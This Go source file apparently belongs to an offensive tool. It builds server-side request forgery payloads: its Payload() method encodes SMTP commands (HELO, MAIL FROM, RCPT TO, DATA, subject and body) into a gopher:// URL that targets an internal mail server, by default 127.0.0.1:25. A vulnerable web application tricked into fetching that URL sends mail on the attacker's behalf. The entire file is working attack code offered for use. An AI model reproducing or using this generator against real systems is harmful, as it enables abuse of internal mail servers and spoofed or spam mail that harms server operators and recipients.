package smtp

import (
	"fmt"
	"net/url"
	"strings"
)

const (
	DefaultAddr   = "127.0.0.1:25"
	DefaultServer = "localhost"
)

type Options struct {
	Addr    string
	Server  string
	From    string
	To      string
	Subject string
	Msg     string
}

type SMTP struct {
	addr    string
	server  string
	from    string
	to      string
	subject string
	msg     string
}

func NewSMTP(optFns ...func(o *Options)) *SMTP {
	options := Options{
		Addr:   DefaultAddr,
		Server: DefaultServer,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &SMTP{
		addr:    strings.TrimSpace(options.Addr),
		server:  strings.TrimSpace(options.Server),
		from:    strings.TrimSpace(options.From),
		to:      strings.TrimSpace(options.To),
		subject: strings.TrimSpace(options.Subject),
		msg:     strings.TrimSpace(options.Msg),
	}
}

func (smtp *SMTP) Payload() string {
	commands := []string{
		fmt.Sprintf("HELO %s", smtp.server),
		fmt.Sprintf("MAIL FROM:<%s>", smtp.from),
		fmt.Sprintf("RCPT TO:<%s>", smtp.to),
		"DATA",
		fmt.Sprintf("Subject:%s", smtp.subject),
		smtp.msg,
		".",
	}

	payload := url.QueryEscape(strings.Join(commands, "%0A"))
	payload = strings.ReplaceAll(payload, "+", "%20")
	payload = strings.ReplaceAll(payload, "%2F", "/")
	payload = strings.ReplaceAll(payload, "%25", "%")
	payload = strings.ReplaceAll(payload, "%3A", ":")

	return fmt.Sprintf("gopher://%s/_%s", smtp.addr, payload)
}
